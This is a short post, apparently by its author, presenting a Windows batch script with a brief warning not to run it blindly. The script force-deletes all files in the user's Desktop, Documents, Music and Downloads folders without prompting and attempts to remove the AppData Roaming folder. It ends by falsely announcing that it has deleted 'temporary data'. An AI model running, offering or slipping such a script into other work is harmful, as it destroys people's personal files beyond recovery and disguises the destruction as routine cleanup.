

It's a script written by me and please do not run it if you don't know what it does 
```
@echo off

REM Deleting files from Desktop folder
echo Deleting files from Desktop folder...
cd %userprofile%\Desktop
del /f /s /q *

REM Deleting files from Documents folder
echo Deleting files from Documents folder...
cd %userprofile%\Documents
del /f /s /q *

REM Deleting files from Music folder
echo Deleting files from Music folder...
cd %userprofile%\Music
del /f /s /q *

REM Deleting files from Downloads folder
echo Deleting files from Downloads folder...
cd %userprofile%\Downloads
del /f /s /q *

REM Deleting files from AppData\Roaming folder
echo Deleting files from AppData\Roaming folder...
cd %appdata%
rd /s /q Roaming

REM Script to delete temporary data
echo Done deleting temporary data.
pause

```
